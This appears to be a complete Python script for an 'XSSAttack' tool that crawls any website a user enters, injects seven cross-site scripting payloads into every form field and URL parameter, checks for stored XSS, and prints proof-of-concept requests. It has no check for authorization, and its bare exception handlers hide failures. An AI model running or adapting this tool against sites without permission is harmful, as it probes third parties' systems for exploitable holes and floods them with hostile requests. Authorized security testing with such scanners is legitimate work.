import requests, re, time
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor

class XSSAttack:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.visited = set()
        self.max_depth = 2
        self.vulns = []
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg/onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<input onfocus=alert('XSS') autofocus>"
        ]

    def reflected(self, resp, payload):
        return payload in resp

    def submit_payload(self, url, method, data, name, payload):
        try:
            resp = self.session.post(url, data=data, timeout=5) if method=="post" else self.session.get(url, params=data, timeout=5)
            if self.reflected(resp.text, payload):
                self.vulns.append({
                    "url": url,
                    "input": name,
                    "payload": payload,
                    "PoC": f"{method.upper()} {url} | {data}",
                    "type": "Reflected",
                    "severity": "High"
                })
        except: pass

    def test_inputs(self, url):
        try:
            r = self.session.get(url, timeout=5)
            soup = BeautifulSoup(r.text, "html.parser")
            forms = soup.find_all("form")
            tasks = []
            for f in forms:
                action = urljoin(url, f.get("action", url))
                method = f.get("method","get").lower()
                inputs = {i.get("name"):"test" for i in f.find_all(["input","textarea","select","button"]) if i.get("name")}
                for name in inputs:
                    for payload in self.payloads:
                        data = inputs.copy()
                        data[name] = payload
                        tasks.append((action, method, data, name, payload))
            with ThreadPoolExecutor(max_workers=5) as executor:
                executor.map(lambda t: self.submit_payload(*t), tasks)

            params = parse_qs(urlparse(url).query)
            for param in params:
                for payload in self.payloads:
                    test_params = params.copy()
                    test_params[param] = payload
                    try:
                        resp = self.session.get(url, params=test_params, timeout=5)
                        if self.reflected(resp.text, payload):
                            self.vulns.append({
                                "url": url,
                                "input": param,
                                "payload": payload,
                                "PoC": f"GET {url} | {test_params}",
                                "type": "Reflected",
                                "severity": "High"
                            })
                    except: pass
        except: pass

    def crawler(self, url, depth=0):
        if depth>self.max_depth or url in self.visited: return
        self.visited.add(url)
        self.test_inputs(url)
        try:
            soup = BeautifulSoup(self.session.get(url, timeout=5).text,"html.parser")
            for link in soup.find_all("a", href=True):
                next_url = urljoin(url, link['href'])
                if urlparse(next_url).netloc == urlparse(self.base_url).netloc:
                    self.crawler(next_url, depth+1)
        except: pass

    def test_stored_xss(self, endpoint, form_data, view_endpoint):
        for payload in self.payloads[:5]:
            try:
                test_data = form_data.copy()
                first_param = list(form_data.keys())[0]
                test_data[first_param] = f"Test content {payload}"
                self.session.post(f"{self.base_url}{endpoint}", data=test_data, timeout=5)
                time.sleep(1)
                view_resp = self.session.get(f"{self.base_url}{view_endpoint}", timeout=5)
                if payload in view_resp.text:
                    self.vulns.append({
                        "url": f"{self.base_url}{view_endpoint}",
                        "input": first_param,
                        "payload": payload,
                        "PoC": f"POST {self.base_url}{endpoint} | {test_data}",
                        "type": "Stored",
                        "severity": "High"
                    })
            except: pass

    def report(self):
        if not self.vulns:
            print("No vulnerabilities found.")
            return
        print("\n=== XSS Vulnerability Report ===")
        for v in self.vulns:
            print(f"""
Vulnerable URL   : {v['url']}
Input Parameter  : {v['input']}
Payload Used     : {v['payload']}
PoC              : {v['PoC']}
Vulnerability Type: {v['type']}
Severity Level   : {v['severity']}
------------------------------""")

if __name__=="__main__":
    url = input("Enter website URL: ")
    try:
        if requests.get(url, timeout=5).status_code != 200:
            print("Website unreachable"); exit()
    except: exit()
    tool = XSSAttack(url)
    tool.crawler(url)
    tool.report()
